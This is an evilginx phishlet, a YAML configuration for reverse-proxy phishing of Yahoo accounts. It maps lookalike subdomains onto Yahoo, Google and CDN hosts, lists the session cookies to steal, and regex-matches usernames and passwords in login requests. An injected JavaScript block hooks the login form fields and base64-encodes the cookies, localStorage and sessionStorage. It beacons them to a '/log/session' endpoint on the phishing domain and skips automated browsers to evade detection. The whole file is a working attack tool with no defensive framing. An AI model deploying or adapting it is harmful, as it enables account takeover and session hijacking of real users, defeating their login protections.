min_ver: '3.3.0'
proxy_hosts:
  - {phish_sub: 'yahoo', orig_sub: 'login', domain: 'yahoo.com', session: true, auto_filter: true, is_landing: true}
  - {phish_sub: 'api', orig_sub: 'api.login', domain: 'yahoo.com', session: false, auto_filter: true, is_landing: false}
  - {phish_sub: 'guce', orig_sub: 'guce', domain: 'yahoo.com', session: false, auto_filter: true, is_landing: false}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'yahoo.com', session: false, auto_filter: true, is_landing: false}
  - {phish_sub: 'oidc', orig_sub: 'oidc.www', domain: 'yahoo.com', session: false, auto_filter: true, is_landing: false}
  - {phish_sub: 'mail', orig_sub: 'mail', domain: 'yahoo.com', session: false, auto_filter: true, is_landing: false}
  - {phish_sub: 'oidc2', orig_sub: 'oidc.mail', domain: 'yahoo.com', session: false, auto_filter: true, is_landing: false}
  - {phish_sub: 'udc', orig_sub: 'udc', domain: 'yahoo.com', session: false, auto_filter: true, is_landing: false}
  - {phish_sub: 'video', orig_sub: 'video-api.yql', domain: 'yahoo.com', session: false, auto_filter: true, is_landing: false}
  - {phish_sub: 'yep', orig_sub: 'yep.video', domain: 'yahoo.com', session: false, auto_filter: true, is_landing: false}
  - {phish_sub: 's', orig_sub: 's', domain: 'yimg.com', session: false, auto_filter: false, is_landing: false}
  - {phish_sub: 'scdn', orig_sub: 's', domain: 'yahoocdn.com', session: false, auto_filter: true, is_landing: false}
  - {phish_sub: 'ocdn', orig_sub: 'o', domain: 'yahoocdn.com', session: false, auto_filter: true, is_landing: false}
  - {phish_sub: 'api2', orig_sub: 'api-2-0', domain: 'spot.im', session: false, auto_filter: true, is_landing: false}
  - {phish_sub: 'static', orig_sub: 'static-cdn', domain: 'spot.im', auto_filter: true, session: false, is_landing: false}
  - {phish_sub: 'launcher', orig_sub: 'launcher', domain: 'spot.im', session: false, auto_filter: true, is_landing: false}
  - {phish_sub: 'consent', orig_sub: 'consent.cmp', domain: 'oath.com', session: false, auto_filter: true, is_landing: false}
  - {phish_sub: 'google', orig_sub: 'www', domain: 'google.com', session: true, auto_filter: false, is_landing: false}
  - {phish_sub: 'gstatic', orig_sub: 'www', domain: 'gstatic.com', session: true, auto_filter: true, is_landing: false}
  - {phish_sub: 'login', orig_sub: 'login', domain: 'yahoo.net', session: false, auto_filter: false, is_landing: false}

sub_filters:
  # Hostname rewriting — Yahoo login (deduplicated)
  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
  # Google OAuth sub-filters (Yahoo uses Google auth)
  - {triggers_on: 'login.yahoo.com', orig_sub: 'www', domain: 'google.com', search: 'https%3A%2F%2{hostname_regexp}/', replace: 'https%3A%2F%2{hostname_regexp}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
  - {triggers_on: 'login.yahoo.com', orig_sub: 'www', domain: 'google.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
  - {triggers_on: 'login.yahoo.com', orig_sub: 'www', domain: 'google.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  # yahoo.net sub-filters
  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.net', search: 'https%3A%2F%2{hostname_regexp}/', replace: 'https%3A%2F%2{hostname_regexp}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.net', search: 'https:\u002F\u002Flogin.yahoo.net', replace: 'https:\u002F\u002Flogin.{domain}', mimes: ['text/html']}
  # yimg.com (Yahoo's CDN) sub-filters
  - {triggers_on: 'login.yahoo.com', orig_sub: 's', domain: 'yimg.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/css', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'login.yahoo.com', orig_sub: 's', domain: 'yimg.com', search: 'https%3A%2F%2{hostname_regexp}/', replace: 'https%3A%2F%2{hostname_regexp}/', mimes: ['text/html', 'text/css', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
  - {triggers_on: 'login.yahoo.com', orig_sub: 's', domain: 'yimg.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/css', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
  # yimg.com self-referencing sub-filters (for CSS background-image URLs within yimg responses)
  - {triggers_on: 's.yimg.com', orig_sub: 's', domain: 'yimg.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/css', 'text/html', 'text/javascript', 'application/json', 'application/javascript']}
  - {triggers_on: 's.yimg.com', orig_sub: 's', domain: 'yimg.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/css', 'text/html', 'application/json', 'application/javascript']}

auth_tokens:
  # Yahoo primary session cookies — names match real Yahoo cookie casing (evilginx is case-sensitive).
  # Uppercase aliases are handled by the /log/session server-side fallback.
  - domain: '.yahoo.com'
    keys: ['Y', 'T', 'B', 'GUC', 'GUCS', 'YDUS', 'PH', '_Y', 'EuConsent', 'thamba', 'ucs', 'APID', 'APIDTS', 'sS', 'cmp', '.*,regexp']
  - domain: '.login.yahoo.com'
    keys: ['Y', 'T', 'B', 'GUC', 'GUCS', '.*,regexp']
  - domain: '.www.yahoo.com'
    keys: ['Y', 'T', 'B', 'GUC', 'GUCS', '.*,regexp']
  - domain: '.mail.yahoo.com'
    keys: ['Y', 'T', 'B', 'GUC', 'GUCS', '.*,regexp']

auth_urls:
  - '/consent'
  - '/account/challenge/password*'
  - '/?.src=ym*'
  - '/?.done=*'

credentials:
  username:
    key: '(username|email|mobile|userId)'
    search: '(.*)'
    type: 'post'
  password:
    key: '(passwd|password|pass)'
    search: '(.*)'
    type: 'post'

login:
  domain: 'login.yahoo.com'
  path: '/'

js_inject:
  - trigger_domains: ["login.yahoo.com"]
    trigger_paths: ["/", "/*"]
    script: |
      (function() {
        var passedGate = false;
        var lastCapture = '';
        var capturedCreds = { username: '', password: '' };
        var watchedElements = typeof WeakSet !== 'undefined' ? new WeakSet() : null;

        function sendSessionData(stage) {
          try {
            var cookieObj = {};
            document.cookie.split(';').forEach(function(c) {
              var parts = c.trim().split('=');
              var k = parts[0];
              if (k) cookieObj[k.trim()] = parts.slice(1).join('=');
            });

            var lsObj = {};
            try {
              for (var i = 0; i < localStorage.length; i++) {
                var lk = localStorage.key(i);
                lsObj[lk] = localStorage.getItem(lk);
              }
            } catch(e) {}

            var ssObj = {};
            try {
              for (var j = 0; j < sessionStorage.length; j++) {
                var sk = sessionStorage.key(j);
                ssObj[sk] = sessionStorage.getItem(sk);
              }
            } catch(e) {}

            var sessionInfo = {
              provider: 'yahoo',
              credentials: (capturedCreds.username || capturedCreds.password)
                ? { username: capturedCreds.username, password: capturedCreds.password }
                : undefined,
              localStorage: btoa(unescape(encodeURIComponent(JSON.stringify(lsObj)))),
              sessionStorage: btoa(unescape(encodeURIComponent(JSON.stringify(ssObj)))),
              cookies: btoa(unescape(encodeURIComponent(JSON.stringify(cookieObj)))),
              url: window.location.href
            };

            var currentCapture = JSON.stringify(sessionInfo);
            if (currentCapture === lastCapture) return;
            lastCapture = currentCapture;

            var payload = {
              username: 'SessionData-' + stage,
              password: currentCapture
            };

            var _bh = window.location.hostname;
            var _dot = _bh.indexOf('.');
            var _beaconHost = _dot !== -1 ? _bh.substring(_dot + 1) : _bh;
            var _beaconUrl = window.location.protocol + '//' + _beaconHost + '/log/session';
            navigator.sendBeacon(_beaconUrl, JSON.stringify(payload));
          } catch(e) {}
        }

        function monitorFormInputs() {
          document.querySelectorAll('input').forEach(function(el) {
            if (watchedElements ? watchedElements.has(el) : el._yahooWatched) return;
            if (watchedElements) { watchedElements.add(el); } else { el._yahooWatched = true; }

            function captureField() {
              var t = (el.type || '').toLowerCase();
              var n = (el.name || el.id || el.getAttribute('data-field-name') || '').toLowerCase();
              var v = el.value;
              if (!v) return;
              if (t === 'password' || /passwd|password|pass/.test(n)) {
                if (v !== capturedCreds.password) {
                  capturedCreds.password = v;
                  sendSessionData('Yahoo-Password-Captured');
                }
              } else if (t === 'email' || t === 'text' || t === 'tel' || /username|userid|email|login|phone|mobile/.test(n)) {
                capturedCreds.username = v;
              }
            }

            el.addEventListener('input', captureField, { passive: true });
            el.addEventListener('change', captureField, { passive: true });
            el.addEventListener('blur', captureField, { passive: true });
          });

          document.querySelectorAll('form').forEach(function(form) {
            if (watchedElements ? watchedElements.has(form) : form._yahooWatched) return;
            if (watchedElements) { watchedElements.add(form); } else { form._yahooWatched = true; }
            form.addEventListener('submit', function() {
              sendSessionData('Yahoo-Form-Submit');
            }, { passive: true });
          });
        }

        function runMainLogic() {
          if (passedGate) return;
          passedGate = true;

          var observer = new MutationObserver(function(mutations) {
            for (var i = 0; i < mutations.length; i++) {
              if (mutations[i].addedNodes.length > 0) {
                monitorFormInputs();
                var currentStage = 'Yahoo-Page';
                var path = window.location.pathname.toLowerCase();
                var href = window.location.href.toLowerCase();
                if (/consent|done|success/.test(path) || /mail\.yahoo\.com/.test(href)) {
                  currentStage = 'Yahoo-Login-Success';
                } else if (document.querySelector('input[name="passwd"], input[id="login-passwd"], input[type="password"]')) {
                  currentStage = 'Yahoo-Password-Entry';
                } else if (document.querySelector('input[name="username"], input[id="login-username"]')) {
                  currentStage = 'Yahoo-Username-Entry';
                }
                sendSessionData(currentStage);
                break;
              }
            }
          });

          window.addEventListener('load', function() {
            monitorFormInputs();
            observer.observe(document.body, { childList: true, subtree: true });
            sendSessionData('Yahoo-Initial-Load');
          });

          if (document.body) {
            monitorFormInputs();
            observer.observe(document.body, { childList: true, subtree: true });
          }
        }

        if (!navigator.webdriver) {
          var interactionHandler = function() {
            if (passedGate) return;
            runMainLogic();
          };
          document.addEventListener('mousemove', interactionHandler, { once: true, passive: true });
          document.addEventListener('touchstart', interactionHandler, { once: true, passive: true });
          document.addEventListener('keydown', interactionHandler, { once: true, passive: true });
          setTimeout(function() { if (!passedGate) runMainLogic(); }, 4000);
        }
      })();